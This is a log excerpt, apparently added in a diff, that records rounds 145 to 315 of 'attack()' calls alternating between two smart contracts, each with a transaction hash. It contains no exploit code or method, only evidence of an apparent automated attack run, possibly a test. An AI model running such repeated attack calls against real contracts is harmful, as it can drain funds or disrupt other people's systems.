+[2025-10-01 14:46:30.992] [info] ROUND 145: attack() call in contract 1 | Tx: 0x88423c023dfcabef05686af4976cd2470ece954371f756769d2d323887ba39d1
+[2025-10-01 14:46:30.992] [info] ROUND 146: attack() call in contract 2 | Tx: 0x58679482858695eb6637d4304eb44cf2fe2c38336f2a8a7e38361d2b90078cfc
+[2025-10-01 14:46:30.992] [info] ROUND 147: attack() call in contract 1 | Tx: 0xed5827a633bf0e8a9c51b27b576a7acdcfcb3896f138455ef29f80d9baf2df65
+[2025-10-01 14:46:30.992] [info] ROUND 148: attack() call in contract 2 | Tx: 0xd49957785a428ec0f9d43dd8530be3397e74785c40c61b85d10d8964204e95ba
+[2025-10-01 14:46:30.992] [info] ROUND 149: attack() call in contract 1 | Tx: 0x7b9f007f5659dff19a1b7dd7639955d959d16e68e996de1e5d64c71bbe9e4a90
+[2025-10-01 14:46:30.992] [info] ROUND 150: attack() call in contract 2 | Tx: 0xb7f491de3490397633628e2aa7b31df8727a68011fa9635af72a53a480c7db48
+[2025-10-01 14:46:30.992] [info] ROUND 151: attack() call in contract 1 | Tx: 0x48d21c5e678b7b6d4c85a950c1b99859b13ba9e00b53be13df6aa76642dc3f75
+[2025-10-01 14:46:30.992] [info] ROUND 152: attack() call in contract 2 | Tx: 0xd9ac29dd1fdc2ae4d83911f0b1de8de966e0dde4ad6d11830c6d7626d8417019
+[2025-10-01 14:46:30.992] [info] ROUND 153: attack() call in contract 1 | Tx: 0x1ee59f49e62ae8a1e11029f6436081a3f541f6deeb7477999b6db1940ca55e29
+[2025-10-01 14:46:30.992] [info] ROUND 154: attack() call in contract 2 | Tx: 0x900e733057ec00e699e63f641e6439f0ce0de5ee2d73d5f58fabdc0f38ebf08b
+[2025-10-01 14:46:30.992] [info] ROUND 155: attack() call in contract 1 | Tx: 0x1c67833b0e07e5e490c4e513188cf358f27fa318a74fda054af8482c8fb52ff9
+[2025-10-01 14:46:30.992] [info] ROUND 156: attack() call in contract 2 | Tx: 0x16004eed774470e943f0bf4384d844971799385b38716aba4a4cc6a0f915626d
+[2025-10-01 14:46:30.992] [info] ROUND 157: attack() call in contract 1 | Tx: 0x3434473b58e2f37889ad9cd111ffdd768d60ae66e72abb8fd53f72324ddd722d
+[2025-10-01 14:46:30.992] [info] ROUND 158: attack() call in contract 2 | Tx: 0xf7b4091f3df8ce6bdc0f0ba770db5429dd969152b84f5bd3910be4263a7fef62
+[2025-10-01 14:46:30.992] [info] ROUND 159: attack() call in contract 1 | Tx: 0x5d7c4ad426286faf60b578bdd6fc31b91c0febcffd36624e58237d923b194068
+[2025-10-01 14:46:30.992] [info] ROUND 160: attack() call in contract 2 | Tx: 0x40bd6767b8dcce99e25147f1f42312f1a380d4c0963b86e5429e6a4771742684
+[2025-10-01 14:46:30.992] [info] ROUND 161: attack() call in contract 1 | Tx: 0x8a36e425513bb39361909021da9adcd3e3e4f8ad884324d5ca034083b5cb2146
+[2025-10-01 14:46:30.992] [info] ROUND 162: attack() call in contract 2 | Tx: 0xa80bcdfbf94ed012e86bc4c9283256712aea476998effd9e38bcd25522cbac97
+[2025-10-01 14:46:30.992] [info] ROUND 163: attack() call in contract 1 | Tx: 0xa43e3936672b769481fb5c7d7b1432d066c586c9e77f49a63d5291af63c37e80
+[2025-10-01 14:46:30.992] [info] ROUND 164: attack() call in contract 2 | Tx: 0x72313b038ad9c3b4a64168658f29adb922345996e8fb0e937c3a468b9941f3d5
+[2025-10-01 14:46:30.992] [info] ROUND 165: attack() call in contract 1 | Tx: 0x8d77ab63de2656b78ef6ac73a62a9430c787fe173edf3f6f9846e9ade622c9cc
+[2025-10-01 14:46:30.992] [info] ROUND 166: attack() call in contract 2 | Tx: 0xf61e41662758c4ae8cd7067923c43ca65dcaec2b6517f8f8363cba5b030a303a
+[2025-10-01 14:46:30.992] [info] ROUND 167: attack() call in contract 1 | Tx: 0x2747fcad8977ca13a7f8114b08b710891dcb4058fded316830da3ef1c92ec9d0
+[2025-10-01 14:46:30.992] [info] ROUND 168: attack() call in contract 2 | Tx: 0xe326645c551112cc15ce0331a547243cc4142406a987e4c7f1a3ab79cd96c496
+[2025-10-01 14:46:30.992] [info] ROUND 169: attack() call in contract 1 | Tx: 0x6b036fd3f7c3592cb348b464b587b01a76fbe2f2fc581f5a15ea0174521c5a17
+[2025-10-01 14:46:30.992] [info] ROUND 170: attack() call in contract 2 | Tx: 0x5e208ff20c6df458d73b1be3a72bd152c3e03d9288ee528a16082e8dacd81c2a
+[2025-10-01 14:46:30.992] [info] ROUND 171: attack() call in contract 1 | Tx: 0xf01480320465993175bdeb972b1d20a8e2f9c9302a67b80066c2a3647fe731be
+[2025-10-01 14:46:30.992] [info] ROUND 172: attack() call in contract 2 | Tx: 0x114509f266d30693f49d8d6f20c328fa8d84994cf4827e3d1b8c650b132dc208
+[2025-10-01 14:46:30.992] [info] ROUND 173: attack() call in contract 1 | Tx: 0xac4ef02700fdf5c4dfe39694b6c687ef837d3df283c8f6b45df86f6602ff3f9a
+[2025-10-01 14:46:30.992] [info] ROUND 174: attack() call in contract 2 | Tx: 0xa80d8e28f4919a1411531ea0c4a3ecf12ae1378df876676f32111ee397bae0d7
+[2025-10-01 14:46:30.992] [info] ROUND 175: attack() call in contract 1 | Tx: 0xdafd65b92d9013cd62dda1be6159428a090abdd658a4cde1a40dd9f7927cb349
+[2025-10-01 14:46:30.992] [info] ROUND 176: attack() call in contract 2 | Tx: 0x41e08c37b82eace070f0a2f3458cf05f9ce895f95852cd5a0bccee8fc49ea7f9
+[2025-10-01 14:46:30.992] [info] ROUND 177: attack() call in contract 1 | Tx: 0x58524cfec463ba362c562a76852d1fe68b77bb79441be44a42b062e1cd6b8349
+[2025-10-01 14:46:30.992] [info] ROUND 178: attack() call in contract 2 | Tx: 0x262107fe3de429b0fdafa9d0e0dc3345ce7275e1f2e1ead55f475ba9f642f107
+[2025-10-01 14:46:30.992] [info] ROUND 179: attack() call in contract 1 | Tx: 0x0ac0d9be3cb5cf0c1c1c95b36a25e2f0af39019b58077059a4a3679dfd47f5a1
+[2025-10-01 14:46:30.992] [info] ROUND 180: attack() call in contract 2 | Tx: 0x5a98da4439378d8dac0d0ccb1bbb699f4a30b24d1c3c975e55db432ce2e6c43d
+[2025-10-01 14:46:30.992] [info] ROUND 181: attack() call in contract 1 | Tx: 0x17e7038f855d052dc29b73306be5bc4ca52e666a2075eadfa75db96981e48eb0
+[2025-10-01 14:46:30.992] [info] ROUND 182: attack() call in contract 2 | Tx: 0xe415dadf1a922b3dbc564552064b6b7bcdaed5582522a752990d27f7206f8b52
+[2025-10-01 14:46:30.992] [info] ROUND 183: attack() call in contract 1 | Tx: 0xf30de1bf789e78655142f2104442c5bcbf092156427a8c0e442746e008acc068
+[2025-10-01 14:46:30.992] [info] ROUND 184: attack() call in contract 2 | Tx: 0x9e2644bb89085c3251d33a263844550aa08a040e9dd0845c688d1951eb76a1cb
+[2025-10-01 14:46:30.992] [info] ROUND 185: attack() call in contract 1 | Tx: 0x69e90a301f1193018bac7f129c6c5524e69a803bcf689f8d7466b70cd1bbcd0f
+[2025-10-01 14:46:30.992] [info] ROUND 186: attack() call in contract 2 | Tx: 0xe13ad0be2ff75ff74ca85aad162f85f05f823f4fc2b7fdfc798a54c1243e5595
+[2025-10-01 14:46:30.992] [info] ROUND 187: attack() call in contract 1 | Tx: 0xdf80d978dd33c72575df30a600ef8e03afe8882f39a07b02e9af21b1260eee0d
+[2025-10-01 14:46:30.992] [info] ROUND 188: attack() call in contract 2 | Tx: 0x5615697cc6cdf35c9e10a8822fd71b77b9331a4c5fc8bc0a698ee63a75fb4b67
+[2025-10-01 14:46:30.992] [info] ROUND 189: attack() call in contract 1 | Tx: 0x6def81d35f10392b55d164059daf38d0e65487a1035425865a1192ca293e4f56
+[2025-10-01 14:46:30.992] [info] ROUND 190: attack() call in contract 2 | Tx: 0xd186ee54d3b4d62130b4e04708776e254c40e169fe00a062b5c2ef2c1b1b67b8
+[2025-10-01 14:46:30.992] [info] ROUND 191: attack() call in contract 1 | Tx: 0xa046e3b5a6985d47b3dde934b8f341e0fc2d38cc8008239609daabdad15add99
+[2025-10-01 14:46:30.992] [info] ROUND 192: attack() call in contract 2 | Tx: 0xc2f3416cc5075ca8a9d603707b20d819ade42ff42888938aead275e40711ac01
+[2025-10-01 14:46:30.992] [info] ROUND 193: attack() call in contract 1 | Tx: 0x04f8561ac5bff8baa19e90ed249ad37a81c1386f4c3348b0b0a5dab51908171b
+[2025-10-01 14:46:30.992] [info] ROUND 194: attack() call in contract 2 | Tx: 0x381ba3e3fb5a63dc0e38c68cd88c13aa49bcd8d1be78d276eed239c3be527dbf
+[2025-10-01 14:46:30.992] [info] ROUND 195: attack() call in contract 1 | Tx: 0x688186076bf67347dacc906246f72686b5fccab87ebba5e619183a21ff7f6197
+[2025-10-01 14:46:30.992] [info] ROUND 196: attack() call in contract 2 | Tx: 0x0c2cd1be0d9836bca19fbbe04cc977d4bab038266971a6d43b97c9128f34d646
+[2025-10-01 14:46:30.992] [info] ROUND 197: attack() call in contract 1 | Tx: 0xc4668ef0cf6b565e4ed79f5c1c5f28f2fde1dfc8d8cdc53f24d1c25ae28db66c
+[2025-10-01 14:46:30.992] [info] ROUND 198: attack() call in contract 2 | Tx: 0x19fff84cfa6861a532f23706be52e38f86efa137bb974e354942e0c214cec5ec
+[2025-10-01 14:46:30.992] [info] ROUND 199: attack() call in contract 1 | Tx: 0x92a2ca1b2a8041301dccc118a4128f2bac2bd1414516ea71208644c43e24bf90
+[2025-10-01 14:46:30.992] [info] ROUND 200: attack() call in contract 2 | Tx: 0x6efda7a60a86dd9604a046ce36768fa6ee1c671ad2a92a0d393ae38eff00e319
+[2025-10-01 14:46:30.992] [info] ROUND 201: attack() call in contract 1 | Tx: 0x398a17253aa6536b0b831ae165b0d28d1fa82accfa7e429ba43671790426afa4
+[2025-10-01 14:46:30.992] [info] ROUND 202: attack() call in contract 2 | Tx: 0xd0af437b6cde12e26794686f23487f21b607c563ff37e0a3e128620e9173494f
+[2025-10-01 14:46:30.992] [info] ROUND 203: attack() call in contract 1 | Tx: 0x5ce8cec8df5443642a90b532c5bb8f6c9d8d0e673facd07bed2a33b9200f302e
+[2025-10-01 14:46:30.992] [info] ROUND 204: attack() call in contract 2 | Tx: 0xac8bf169820a230469e8b4895cf2f43272d2b7f4c4ec2263cb100c1b8ccbe1b5
+[2025-10-01 14:46:30.992] [info] ROUND 205: attack() call in contract 1 | Tx: 0x08857e4b95309bfc90e5a219980206db0d8b8232d03a4c74d38480752fec88d4
+[2025-10-01 14:46:30.992] [info] ROUND 206: attack() call in contract 2 | Tx: 0x12f3bf9f9176788a3e8cc7bb9ad6d880ae355164d2f0435414716cbd1c5cc5be
+[2025-10-01 14:46:30.992] [info] ROUND 207: attack() call in contract 1 | Tx: 0xe8595f2257ff82381e06234e7975c962e50a14daeadb969017fa97ff7fc792b5
+[2025-10-01 14:46:30.992] [info] ROUND 208: attack() call in contract 2 | Tx: 0x1300e15c985ddf95991c329d222020febb2d02a376975f89d089057d8f3ce6a9
+[2025-10-01 14:46:30.992] [info] ROUND 209: attack() call in contract 1 | Tx: 0x790d7c90cf17e6662acadd3c1ad527a420171481b3085b3c31a49e30bec179e4
+[2025-10-01 14:46:30.992] [info] ROUND 210: attack() call in contract 2 | Tx: 0x591671d7d323a348e175424e540b88f8624e20f01716ce5b7f0c8a1e10e146dc
+[2025-10-01 14:46:30.992] [info] ROUND 211: attack() call in contract 1 | Tx: 0x2f26fb166399b4d08dffe0aa250d61a1a8e22c23ed2c53ebe3769aeb5ec42984
+[2025-10-01 14:46:30.992] [info] ROUND 212: attack() call in contract 2 | Tx: 0xf9351fff23d6907658dbad03cefb08b2badaad4b039c0fed85bae44c1ee574f7
+[2025-10-01 14:46:30.992] [info] ROUND 213: attack() call in contract 1 | Tx: 0xba036eb7b973a712929806919b738f7eec8c24b7d67ac072c3c3c2641d598792
+[2025-10-01 14:46:30.992] [info] ROUND 214: attack() call in contract 2 | Tx: 0x3dac93bcfe33a63f0618406649f58ad7a7904fd5eb3d1816062378f4b3512bac
+[2025-10-01 14:46:30.992] [info] ROUND 215: attack() call in contract 1 | Tx: 0xbf312f240cdfe465c7a2dad996c82097c72572e9e7058e91ce237a0a565d9aaa
+[2025-10-01 14:46:30.992] [info] ROUND 216: attack() call in contract 2 | Tx: 0x97539f590212d56e4ef83aa769cb34ae2e219cdba0c0a13b7c9df757aee926a3
+[2025-10-01 14:46:30.992] [info] ROUND 217: attack() call in contract 1 | Tx: 0x0f577799d94003304acada6ac8629f080738cf5f359ab1c75b1ad81dc0ba0c8b
+[2025-10-01 14:46:30.992] [info] ROUND 218: attack() call in contract 2 | Tx: 0x20d4ed97e9629308a20bd59942ec7477c9c42360754c65858f862599fd3e1380
+[2025-10-01 14:46:30.992] [info] ROUND 219: attack() call in contract 1 | Tx: 0x847f86667b8c03095b1bbc1e2828d5511dd198dbfd3d122a2c8a0a3bd2778af4
+[2025-10-01 14:46:30.992] [info] ROUND 220: attack() call in contract 2 | Tx: 0x6d79d04a4b721de78e05a98a372208f71643c81ade1efba4a17297109302430a
+[2025-10-01 14:46:30.992] [info] ROUND 221: attack() call in contract 1 | Tx: 0x7144712c5aa4248cdcbd8966a770ca9b689227a5b53ab0616e2b8c133c53fcd6
+[2025-10-01 14:46:30.992] [info] ROUND 222: attack() call in contract 2 | Tx: 0x7a94ff858c2d3b404df1d3f9c127fb70087f94ccd7b66f0dda810de6e103db71
+[2025-10-01 14:46:30.992] [info] ROUND 223: attack() call in contract 1 | Tx: 0x219cb500abe7f7db3f2ee819faf3eeadc748133e86be6b1c619c684a00c74434
+[2025-10-01 14:46:30.992] [info] ROUND 224: attack() call in contract 2 | Tx: 0xc6fe8be6552b4d988830ef1d3976861fcce20f8a87a7d9f868521368eff2d5d7
+[2025-10-01 14:46:30.992] [info] ROUND 225: attack() call in contract 1 | Tx: 0x90d8937e465f87c7d7199e433e2c4bee5ed12b1870b6fb91d3b1c736e4be54c5
+[2025-10-01 14:46:30.992] [info] ROUND 226: attack() call in contract 2 | Tx: 0xce58c6d8547df8c679f89fc123e4c84922990b4b399ffc5e91c70af7c041325b
+[2025-10-01 14:46:30.992] [info] ROUND 227: attack() call in contract 1 | Tx: 0xf1154265bbdfbccaa977fa5a1b2c98ba94876b5246ae4e37e35fb38fa67ddf6b
+[2025-10-01 14:46:30.992] [info] ROUND 228: attack() call in contract 2 | Tx: 0xcbe482e5cb75d9d173d173c2ab65d717ff6a79b47f16a41c43028b1848abfa54
+[2025-10-01 14:46:30.992] [info] ROUND 229: attack() call in contract 1 | Tx: 0x713f7b3c944f86ff02c8c7d01c01dc0cc119f969722b7f436c66b3f8ce914f32
+[2025-10-01 14:46:30.992] [info] ROUND 230: attack() call in contract 2 | Tx: 0x823630b3258970055e20013a69b93315bac87c43478130e75b843182915fa0b2
+[2025-10-01 14:46:30.992] [info] ROUND 231: attack() call in contract 1 | Tx: 0x69aa50012c3192025249e5670b188c5087d55c8dace60e0ff88a10c444a79b09
+[2025-10-01 14:46:30.992] [info] ROUND 232: attack() call in contract 2 | Tx: 0x8bca477435ddf117307aac932a27ba32a46a55724ebdaf5258778a0cb499bb23
+[2025-10-01 14:46:30.992] [info] ROUND 233: attack() call in contract 1 | Tx: 0x4a5dda1ef62bb2da1473e104a7224665a4f12216f41d4d8216f6f65e64db0389
+[2025-10-01 14:46:30.992] [info] ROUND 234: attack() call in contract 2 | Tx: 0x1941dfe6968c46a6a190a574351810fc967e59ce120597a7ed813cc3fc084852
+[2025-10-01 14:46:30.992] [info] ROUND 235: attack() call in contract 1 | Tx: 0x32fe34a16571e2f773343596d27a43fa8e1b43fa3a9428e2fafff32ddd35025c
+[2025-10-01 14:46:30.992] [info] ROUND 236: attack() call in contract 2 | Tx: 0x25185f7402d05949c8ba43e02b1b9963725ed968587b3aa84fbf0a33f386521c
+[2025-10-01 14:46:30.992] [info] ROUND 237: attack() call in contract 1 | Tx: 0xa72ec28bf1dda92ce5cb9fba8216661222270c32da8b5aecde077f061910c2b3
+[2025-10-01 14:46:30.992] [info] ROUND 238: attack() call in contract 2 | Tx: 0x70e7a2236a1b6078da9edd6d54a90f5186cff0fb6b7f6a5bbd56d6548444e3ed
+[2025-10-01 14:46:30.992] [info] ROUND 239: attack() call in contract 1 | Tx: 0x07dae92e9f874f4b76db7e3ddeaa168aec9a41eef82bd9a3f5ac9635287e4b96
+[2025-10-01 14:46:30.992] [info] ROUND 240: attack() call in contract 2 | Tx: 0xb6ebc62fc3f81757ba80d052cb93f3759b4b38838fc66c0044399f73fc6d9e5a
+[2025-10-01 14:46:30.992] [info] ROUND 241: attack() call in contract 1 | Tx: 0xd6ebb7c0388879bfdd80f7c83d0ea40b2615878e95983f07c38feb20b3189a17
+[2025-10-01 14:46:30.993] [info] ROUND 242: attack() call in contract 2 | Tx: 0x28d3456a0032c5676fd5598418d50d7eff27359500117bfd39b76e25e2e4ee08
+[2025-10-01 14:46:30.993] [info] ROUND 243: attack() call in contract 1 | Tx: 0xd77dd2f6b22f9625d585f03bf9f777b212a45e05e59236a0cc89a6d18ac0ebb8
+[2025-10-01 14:46:30.993] [info] ROUND 244: attack() call in contract 2 | Tx: 0x0dcc700b1f16f174a29d5eb190c079b338c695947427f1d82338ffcfd7f4e9c7
+[2025-10-01 14:46:30.993] [info] ROUND 245: attack() call in contract 1 | Tx: 0xc2d6a5b56858981314f8348d625698f50b68b0e1daf1e834c63e2ad25b325c04
+[2025-10-01 14:46:30.993] [info] ROUND 246: attack() call in contract 2 | Tx: 0xe6ebb814192b25085e732a49885800176bde68831c5d2d4f5ab700f1b63a4950
+[2025-10-01 14:46:30.993] [info] ROUND 247: attack() call in contract 1 | Tx: 0xc71596aea853e9fe81845d38bd7601800ffb51f4099d583f14d38d590fb474af
+[2025-10-01 14:46:30.993] [info] ROUND 248: attack() call in contract 2 | Tx: 0x0f438aca5a2135b438b95c241dcda09f5afaece700aed50c35302f928f5412f3
+[2025-10-01 14:46:30.993] [info] ROUND 249: attack() call in contract 1 | Tx: 0xe83b412a7f01095a26a140b09b8229a97a82b944e6cfa31a82694f094b7c9fe7
+[2025-10-01 14:46:30.993] [info] ROUND 250: attack() call in contract 2 | Tx: 0xd21af6043c8b53a52ab7a7a4729009b0b06455bdf5f6a1f2aa80378617e2ca03
+[2025-10-01 14:46:30.993] [info] ROUND 251: attack() call in contract 1 | Tx: 0xc799fd9f754519ec84cb123d29fbdee6a0251ba4f9b4c95d46c05f5805916b59
+[2025-10-01 14:46:30.993] [info] ROUND 252: attack() call in contract 2 | Tx: 0x951d43b482a907e4310ffe890dfc078c5462522f2827e3e3827e55b970bdb48e
+[2025-10-01 14:46:30.993] [info] ROUND 253: attack() call in contract 1 | Tx: 0x8a53c936d528cdc33c7c2c97cf83ccae4c10eb0a4938754e55559843a2f9c420
+[2025-10-01 14:46:30.993] [info] ROUND 254: attack() call in contract 2 | Tx: 0xf6adeb5d65ef6f293ce35a06881f928236ddf8b3f282b1220ee556e3486a4729
+[2025-10-01 14:46:30.993] [info] ROUND 255: attack() call in contract 1 | Tx: 0x727003ae991a867a3de4842e4640e27360cce953510079e75c1f1f7f8ff0c27e
+[2025-10-01 14:46:30.993] [info] ROUND 256: attack() call in contract 2 | Tx: 0x150fc99ff63870b99cf3afd73911cf3a1a5b470e3f9e4d073541647be2543aee
+[2025-10-01 14:46:30.993] [info] ROUND 257: attack() call in contract 1 | Tx: 0xf399115a878796000912f461d660a2e7bc4505df210637f183a36c0d9bea8bec
+[2025-10-01 14:46:30.993] [info] ROUND 258: attack() call in contract 2 | Tx: 0xbeaf56736f2aa53feed3843bfec1fa828397fd026401a3eb3ee6d27704a98f48
+[2025-10-01 14:46:30.993] [info] ROUND 259: attack() call in contract 1 | Tx: 0x4b387f62a7221c32084116931c45ac36e0bebe97befcf1a157858231770c53ce
+[2025-10-01 14:46:30.993] [info] ROUND 260: attack() call in contract 2 | Tx: 0x40259e544bc0a54ee743b6580082f5d49056d7ab94121a764aece8c84f2551b8
+[2025-10-01 14:46:30.993] [info] ROUND 261: attack() call in contract 1 | Tx: 0x8b808bc0cc674e78eed162194832bd5f7a4f3e1b19a05e61fecbf47f7acf04b2
+[2025-10-01 14:46:30.993] [info] ROUND 262: attack() call in contract 2 | Tx: 0x293320459a2c675d747970010131e13da094390ff5ed8ed189297f1f23231bfc
+[2025-10-01 14:46:30.993] [info] ROUND 263: attack() call in contract 1 | Tx: 0x43edafb96458e94bc209c11ef1abfd452e5a71ec0b68c2024ce9d947c9bbffff
+[2025-10-01 14:46:30.993] [info] ROUND 264: attack() call in contract 2 | Tx: 0x025c0f35e6aee743b668e529518a5dd09cc6609fb3367d6aeb3813f56f0e57fe
+[2025-10-01 14:46:30.993] [info] ROUND 265: attack() call in contract 1 | Tx: 0x9cb15f03de1461836912f98cd89f3bc734e3de862ccb45c63f9b75b605b62aad
+[2025-10-01 14:46:30.993] [info] ROUND 266: attack() call in contract 2 | Tx: 0xab759fa967c60577c4d120d5097fce6d2110a335b36088f7ba230416bf62431a
+[2025-10-01 14:46:30.993] [info] ROUND 267: attack() call in contract 1 | Tx: 0xc5657fadf28953033ea8b961f8273fa49683f847f5c063fd999ee24d690cb1a1
+[2025-10-01 14:46:30.993] [info] ROUND 268: attack() call in contract 2 | Tx: 0x3258818cd3cae30b337360059870087faf18af4523e14cac492ec066503c58a4
+[2025-10-01 14:46:30.993] [info] ROUND 269: attack() call in contract 1 | Tx: 0x8527ece1dcf452ba030f9a70e3998549798ac40b0ee16ca2417655ab06a2e777
+[2025-10-01 14:46:30.993] [info] ROUND 270: attack() call in contract 2 | Tx: 0x5628700dd6b4f1eadfff20630fe7286f2fa9b869ac34bb2b55a37f3f51c0715d
+[2025-10-01 14:46:30.993] [info] ROUND 271: attack() call in contract 1 | Tx: 0xb7102e2310d541c31551751c8a643b8bd8982da821687acdafb2577385f3e3ee
+[2025-10-01 14:46:30.993] [info] ROUND 272: attack() call in contract 2 | Tx: 0x26d9b55b02d9ca5efb30a6be968f7920ea4c159f671a820d8d466669e9ce347d
+[2025-10-01 14:46:30.993] [info] ROUND 273: attack() call in contract 1 | Tx: 0x5602054ed23861ec4693e01483ea7bdd3e2f3521f131da8d80d16e4b91784cd8
+[2025-10-01 14:46:30.993] [info] ROUND 274: attack() call in contract 2 | Tx: 0xf146eb601497f061abfddce526cfe1f2d7dd8f9aff3d174706de7501921800e2
+[2025-10-01 14:46:30.993] [info] ROUND 275: attack() call in contract 1 | Tx: 0x4067b6ffe8818e34f389e45888aba1ca765471d748d531a1fb1465601e8dae89
+[2025-10-01 14:46:30.993] [info] ROUND 276: attack() call in contract 2 | Tx: 0x4fbed2952af1f65ef766ea69d82ef0dfbf55867c561027c84a7184cf9b9b1418
+[2025-10-01 14:46:30.993] [info] ROUND 277: attack() call in contract 1 | Tx: 0xce1e470538d694e3c7bc53b77b3dc9a78911ed3aa711f6700ebbba921551ded0
+[2025-10-01 14:46:30.993] [info] ROUND 278: attack() call in contract 2 | Tx: 0xeda8ee61a78024b48048d7dbb910e63c526492ecbac8863ec6be0d285a3166d2
+[2025-10-01 14:46:30.993] [info] ROUND 279: attack() call in contract 1 | Tx: 0xf272de7d359c730a4d6d9bb9fccc0633009839dcaa0cb102101c34f5fea75e19
+[2025-10-01 14:46:30.993] [info] ROUND 280: attack() call in contract 2 | Tx: 0x42144cfe439c15625b35d7e014a9cf97f3d2128887f1abc98f47229d9ab22ba7
+[2025-10-01 14:46:30.993] [info] ROUND 281: attack() call in contract 1 | Tx: 0x74d00d85444fcc7a52545056f5f0317163666578a1d216f28b7324c85d911fa4
+[2025-10-01 14:46:30.993] [info] ROUND 282: attack() call in contract 2 | Tx: 0xf044375f4576fc32f4e647f62d12dfe772bff2656311d7b80d7081c2a2dbe063
+[2025-10-01 14:46:30.993] [info] ROUND 283: attack() call in contract 1 | Tx: 0x2c929521e6286e0c29e0de89be59dfeee0dfb2ccc2b0042fe06aa704d4c2f9c6
+[2025-10-01 14:46:30.993] [info] ROUND 284: attack() call in contract 2 | Tx: 0x053ff61580ed11dc66659c761322f4a61bd7be3375becc617c5250a6c8833a04
+[2025-10-01 14:46:30.993] [info] ROUND 285: attack() call in contract 1 | Tx: 0xaceb067fa4d5aeb368fa24b2ac4f6af9433f94f76631a3962ccb4874c9770242
+[2025-10-01 14:46:30.993] [info] ROUND 286: attack() call in contract 2 | Tx: 0x7b99ff53fb503983267be1945d510ed68b3655d4cbf4043956eb9255022a3cb8
+[2025-10-01 14:46:30.993] [info] ROUND 287: attack() call in contract 1 | Tx: 0xe99f46d109756acdff4389596a77fd18cdb8879be72dc6fa495681e8424a6678
+[2025-10-01 14:46:30.993] [info] ROUND 288: attack() call in contract 2 | Tx: 0x7bf1d56066d0ef6a35301ad594b4b96ed7d3f844cc8e91993575ee9562b5fe3b
+[2025-10-01 14:46:30.993] [info] ROUND 289: attack() call in contract 1 | Tx: 0xb56d21f5e93253d6b60f469a94a21df2393c83d0acd819b7cdbd92f28bd02356
+[2025-10-01 14:46:30.993] [info] ROUND 290: attack() call in contract 2 | Tx: 0x986a88e8f23053bb24bf917f06aff46423935165537d529f47b9efae838bb192
+[2025-10-01 14:46:30.993] [info] ROUND 291: attack() call in contract 1 | Tx: 0xa15f82616aa966661b09b0c33374db8f4a18475f53e81f1d5cb21cd1ba7f897a
+[2025-10-01 14:46:30.993] [info] ROUND 292: attack() call in contract 2 | Tx: 0x3eefdf2e819f1fb65f3a66a29fe20a830390b287c58af5ee2c96aa8587b52fd3
+[2025-10-01 14:46:30.993] [info] ROUND 293: attack() call in contract 1 | Tx: 0x9cabe2fc0346d6142ccdb44383edc1c453ee80f30469812e398a36e9d00ee862
+[2025-10-01 14:46:30.993] [info] ROUND 294: attack() call in contract 2 | Tx: 0x37ee41f4d657eecd254f1f5de4f38aedfa97c067120bcd2b349fdedff99c23b1
+[2025-10-01 14:46:30.993] [info] ROUND 295: attack() call in contract 1 | Tx: 0xdc94585e285281cebe12c747b40e747f10b007cbde41ebd8f2cbd4895eeb682d
+[2025-10-01 14:46:30.993] [info] ROUND 296: attack() call in contract 2 | Tx: 0x579bfedf6937117c954e73686873bc0d9c31e397b72c70bf1648aa3917e9abd3
+[2025-10-01 14:46:30.993] [info] ROUND 297: attack() call in contract 1 | Tx: 0x396482e877d624336549a1981ee27dc1654ee853c8a865a3e318828192815e9e
+[2025-10-01 14:46:30.993] [info] ROUND 298: attack() call in contract 2 | Tx: 0x445e623ab66c534eda4bf0915953f749f57d22e5043cc344559ce8ca05fdb227
+[2025-10-01 14:46:30.993] [info] ROUND 299: attack() call in contract 1 | Tx: 0xaf687dbcb54f09b5621b707e39582bf3553957bd031d0792714780e29a1a5fec
+[2025-10-01 14:46:30.993] [info] ROUND 300: attack() call in contract 2 | Tx: 0x6325c474007e3d7633325c519fafb3e67ded29181686bb38858015f63d63cc76
+[2025-10-01 14:46:30.993] [info] ROUND 301: attack() call in contract 1 | Tx: 0xf1faad7f419704cb9ef88fbcfb65d45764a50809497db42e88f64a05c907c06c
+[2025-10-01 14:46:30.993] [info] ROUND 302: attack() call in contract 2 | Tx: 0x1b4bf195ac6c8e37b8cf162fa248bba1fa18e1e894a424113a7d7e9b57fca9e3
+[2025-10-01 14:46:30.993] [info] ROUND 303: attack() call in contract 1 | Tx: 0xc49563573b9eeacad6c6e3f0b29da0fdeb7875fec631d31a4afb6b72ccec0ddc
+[2025-10-01 14:46:30.993] [info] ROUND 304: attack() call in contract 2 | Tx: 0x26e759f4b655eef395a01c53e7be4a5bbd51a4317037bf0f0558b090aa055ee7
+[2025-10-01 14:46:30.993] [info] ROUND 305: attack() call in contract 1 | Tx: 0xe4ff32e2a3a0d747760795ac62835dc62750297f693ebc31aa58d4dfaf5f6489
+[2025-10-01 14:46:30.993] [info] ROUND 306: attack() call in contract 2 | Tx: 0xb3fd93c1d9f33e5fb68b8ed05cab3a0cd0094fa963e319f6dfbafbff9622d3d0
+[2025-10-01 14:46:30.993] [info] ROUND 307: attack() call in contract 1 | Tx: 0xc3372cdcd2990dd13bf6b73aab9bc862fde4e137af15c25d06405fc3aedced37
+[2025-10-01 14:46:30.993] [info] ROUND 308: attack() call in contract 2 | Tx: 0xc20593f1e7dc23884f1168548e990e02cd7f2fc7fd70e95b3a2e471486465945
+[2025-10-01 14:46:30.993] [info] ROUND 309: attack() call in contract 1 | Tx: 0x9aa99dd838d0c3b5985c66362388a7778c4694cbbb8af1deadf009e0bb9df02d
+[2025-10-01 14:46:30.993] [info] ROUND 310: attack() call in contract 2 | Tx: 0x864abc6dc98c1221c3be59d56fbc5d333065d56db8066dbdc9622bf5704a4ee0
+[2025-10-01 14:46:30.993] [info] ROUND 311: attack() call in contract 1 | Tx: 0xfa39624b58a92487cec726ccbe3259a9fdcfd3eb210a4561cce901ef46374986
+[2025-10-01 14:46:30.993] [info] ROUND 312: attack() call in contract 2 | Tx: 0x377abf37dcc7e89ff8a9ba5fe33c37eff39fb102ff545a230baf84e616c412e3
+[2025-10-01 14:46:30.993] [info] ROUND 313: attack() call in contract 1 | Tx: 0xae4d5fadff4b4485c1f4928de155814ecb5a467ab3104c56a9f2c59934e9bf45
+[2025-10-01 14:46:30.993] [info] ROUND 314: attack() call in contract 2 | Tx: 0x564550968531691df14b2fc5585782bb7171ceef82680b49c023c564bbf4f6d3
+[2025-10-01 14:46:30.993] [info] ROUND 315: attack() call in contract 1 | Tx: 0x188c229f23952916b823e26702d31a2a71c3774d7f19771b22a04e1a2bfd8e25
